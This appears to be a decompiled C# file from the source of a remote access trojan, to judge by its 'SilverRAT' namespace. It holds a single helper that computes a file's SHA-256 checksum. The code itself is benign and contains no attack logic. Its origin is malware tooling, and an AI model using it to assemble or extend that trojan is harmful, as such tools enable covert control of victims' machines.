using System;
using System.IO;
using System.Security.Cryptography;

namespace SilverRAT.Algorithm;

public static class GetHash
{
    public static string GetChecksum(string file)
    {
        using FileStream inputStream = File.OpenRead(file);
        SHA256Managed sHA256Managed = new SHA256Managed();
        byte[] array = sHA256Managed.ComputeHash(inputStream);
        return BitConverter.ToString(array).Replace("-", string.Empty);
    }
}
